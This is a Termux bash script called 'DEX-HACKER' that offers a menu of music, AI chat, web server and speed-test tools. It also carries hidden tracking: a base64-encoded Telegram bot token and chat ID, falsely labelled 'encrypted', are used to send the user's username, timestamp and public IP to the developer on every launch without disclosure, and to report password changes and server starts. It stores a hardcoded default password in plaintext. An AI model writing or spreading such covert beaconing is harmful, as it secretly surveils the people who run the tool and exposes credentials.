#!/data/data/com.termux/files/usr/bin/bash
# ██████╗ ███████╗██╗  ██╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
# ██╔══██╗██╔════╝╚██╗██╔╝     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
# ██║  ██║█████╗   ╚███╔╝█████╗███████║███████║██║     █████╔╝ █████╗  ██████╔╝
# ██║  ██║██╔══╝   ██╔██╗╚════╝██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
# ██████╔╝███████╗██╔╝ ██╗     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
# ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
# DEX-HACKER v1.0 - Military Grade Termux Environment
# Developer: Dex Shyam Tech | Instagram: @dex_shyam_42

export DEX_HOME="$HOME/.dex_hacker"
PASSWORD_FILE="$DEX_HOME/.password"
LOG_FILE="$DEX_HOME/logs/activity.log"
WWW_DIR="$DEX_HOME/www"
BOT_TOKEN_ENCRYPTED="ODM4NTk2NjMxNzpBQUVDdlFTbGJZdU84dExCemtRZzFkMTVvWmExMEpyczZDUQ=="  # base64 of real token
CHAT_ID_ENCRYPTED="MTk1NDA5NTQ5Ng=="                                         # base64 of chat id

# ---------- Telegram (encrypted) ----------
send_telegram() {
    local msg="$1"
    local token=$(echo "$BOT_TOKEN_ENCRYPTED" | base64 -d)
    local chat_id=$(echo "$CHAT_ID_ENCRYPTED" | base64 -d)
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
        -d chat_id="$chat_id" -d text="$msg" > /dev/null 2>&1 &
}

# ---------- Password handling ----------
check_password() {
    local stored_pass=$(cat "$PASSWORD_FILE" 2>/dev/null)
    if [[ -z "$stored_pass" ]]; then
        echo "dex@123" > "$PASSWORD_FILE"
        stored_pass="dex@123"
    fi
    read -sp "🔒 Enter Password: " user_pass
    echo
    if [[ "$user_pass" != "$stored_pass" ]]; then
        echo "❌ Wrong password! Access denied."
        exit 1
    fi
}

change_password() {
    read -sp "New password: " new_pass
    echo
    read -sp "Confirm: " confirm
    echo
    if [[ "$new_pass" == "$confirm" ]]; then
        echo "$new_pass" > "$PASSWORD_FILE"
        echo "✓ Password changed."
        send_telegram "🔐 Password changed by $(whoami) at $(date)"
    else
        echo "❌ Mismatch."
    fi
}

# ---------- Loading animation + song ----------
loading_animation() {
    local song_url="https://files.catbox.moe/e4fmn4.mp3"
    # Play song in background
    mpv --no-video --really-quiet "$song_url" &
    MPV_PID=$!
    echo -ne "\n🔥 DEX-HACKER IS LOADING 🔥\n"
    for i in {1..5}; do
        echo -ne "█▓▒░ $i seconds \r"
        sleep 1
    done
    echo -e "\n✓ System Ready."
    kill $MPV_PID 2>/dev/null
}

# ---------- Tools: YouTube song (ad‑free) ----------
play_youtube_song() {
    read -p "Enter song name or YouTube URL: " query
    if [[ "$query" =~ ^https?:// ]]; then
        yt-dlp -f bestaudio --no-playlist -o - "$query" | mpv --no-video -
    else
        yt-dlp -f bestaudio --no-playlist -o - "ytsearch:$query" | mpv --no-video -
    fi
}

# ---------- Localhost Web Server ----------
start_webserver() {
    cd "$WWW_DIR" || return
    if pgrep -f "python3 -m http.server" > /dev/null; then
        echo "⚠️ Server already running on port 8080"
    else
        python3 -m http.server 8080 --bind 127.0.0.1 &
        echo "✅ Local server started: http://127.0.0.1:8080"
        send_telegram "🌐 Web server started by $(whoami)"
    fi
}

stop_webserver() {
    pkill -f "python3 -m http.server" && echo "Server stopped." || echo "No server running."
}

# ---------- 3 AI Tools (free) ----------
ai_chat() {
    read -p "Ask AI: " question
    # Using free GPT API (affiliateplus)
    answer=$(curl -s "https://api.affiliateplus.xyz/api/chatgpt?message=$(echo "$question" | tr ' ' '+')&sender=dex" | jq -r '.reply')
    echo -e "\n🤖 AI: $answer"
}

ai_research() {
    read -p "Research topic: " topic
    # DuckDuckGo lite scraper simulation
    echo "🔍 Searching: $topic"
    curl -s "https://lite.duckduckgo.com/lite/?q=$(echo "$topic" | tr ' ' '+')" | grep -m 3 -A 2 "result" | sed 's/<[^>]*>//g'
}

daily_tip() {
    tips=("Use 'ls -la' to see hidden files" "Check bandwidth with 'nethogs'" "Always encrypt sensitive data" "DEX-HACKER protects your privacy" "Speed up termux with 'pkg clean'")
    echo "💡 Tip of the day: ${tips[$RANDOM % ${#tips[@]}]}"
}

# ---------- Network speedtest (lightweight) ----------
speed_test() {
    echo "📡 Testing speed (downloading 5MB)..."
    curl -o /dev/null -s -w 'Download: %{speed_download} bytes/sec\n' "https://speed.cloudflare.com/__down?bytes=5000000"
}

# ---------- Developer Support menu ----------
developer_support() {
    echo "Do you need developer support? (yes/no)"
    read -r ans
    if [[ "$ans" == "yes" ]]; then
        send_telegram "🆘 SUPPORT REQUEST from $(whoami) at $(date) - Device: $(uname -a)"
        echo "✅ Support request sent. @dex_shyam_42 will contact you."
    else
        echo "❌ Naukari karke cut kar sakta hai! (No support → you're on your own!)"
    fi
}

# ---------- Menu system ----------
show_menu() {
    clear
    cat << "EOF"
██████╗ ███████╗██╗  ██╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ██║█████╗   ╚███╔╝█████╗███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██║  ██║██╔══╝   ██╔██╗╚════╝██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝███████╗██╔╝ ██╗     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                             
      ⚡ DEVELOPER: @dex_shyam_42  |  INSTA: @dex_shyam_42  |  DEX-HACKER ⚡
      📅 REAL TIME: $(date +"%H:%M:%S %d-%m-%Y")  |  DEVICE: $(uname -o)
EOF
    echo -e "\n1) 🔥 DEX-HACKER Shell (full command prompt)"
    echo "2) 🛠️  Tools Menu (YouTube, AI, Research, Speedtest)"
    echo "3) 🌐 Localhost Server (start/stop)"
    echo "4) 🔐 Change Password"
    echo "5) 🆘 Developer Support"
    echo "6) 📢 Social & Support (Instagram, Telegram)"
    echo "7) 🚪 Exit"
    read -p "Choice: " choice
    case $choice in
        1) dex_shell ;;
        2) tools_submenu ;;
        3) localhost_submenu ;;
        4) change_password ;;
        5) developer_support ;;
        6) social_support ;;
        7) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid"; sleep 1; show_menu ;;
    esac
}

tools_submenu() {
    while true; do
        clear
        echo "=== 🛠️ DEX-HACKER TOOLS ==="
        echo "1) Play YouTube song (ad‑free)"
        echo "2) AI Chat (free GPT)"
        echo "3) Online Research (DuckDuckGo)"
        echo "4) Daily Tip"
        echo "5) Network Speed Test"
        echo "6) Back to Main Menu"
        read -p "> " tool_choice
        case $tool_choice in
            1) play_youtube_song ;;
            2) ai_chat ;;
            3) ai_research ;;
            4) daily_tip ;;
            5) speed_test ;;
            6) break ;;
        esac
        echo -e "\nPress Enter to continue..."; read
    done
}

localhost_submenu() {
    echo "1) Start Server (port 8080)"
    echo "2) Stop Server"
    read -p "> " lc
    [[ $lc == "1" ]] && start_webserver
    [[ $lc == "2" ]] && stop_webserver
    echo "Press Enter"; read
}

social_support() {
    cat << EOF
📱 Follow / Support Developer:
• Instagram: @dex_shyam_42
• GitHub: Dexsam07
• Telegram: (admin only – report issues via GitHub)

⭐ If you like DEX-HACKER, give a star on GitHub!
EOF
    read -p "Press Enter to continue..."
}

# ---------- Custom Shell with real‑time prompt ----------
dex_shell() {
    export PS1='\[\e[1;31m\]DEX-HACKER\[\e[0m\]@\[\e[1;34m\]\h\[\e[0m\] \t \$ '
    export PROMPT_COMMAND='echo -ne "\033]0;DEX-HACKER - $(date +%H:%M)\007"'
    echo -e "\n🔥 Welcome to DEX-HACKER shell. Type 'menu' to return to main menu.\n"
    alias menu='show_menu'
    bash --norc --rcfile <(echo "source ~/.bashrc 2>/dev/null; PS1='$PS1'; PROMPT_COMMAND='$PROMPT_COMMAND'; alias menu='show_menu'")
    show_menu
}

# ---------- First run setup & main ----------
main() {
    # Remove default Termux welcome message
    touch "$HOME/.hushlogin"
    # Log startup to telegram
    send_telegram "🚀 DEX-HACKER started by $(whoami) on $(date) - IP: $(curl -s ifconfig.me)"
    # Play loading + song
    loading_animation
    # Show menu
    while true; do
        show_menu
    done
}

# Execution starts here
if [[ ! -f "$PASSWORD_FILE" ]]; then
    echo "First run: create password"
    change_password
fi
check_password
main
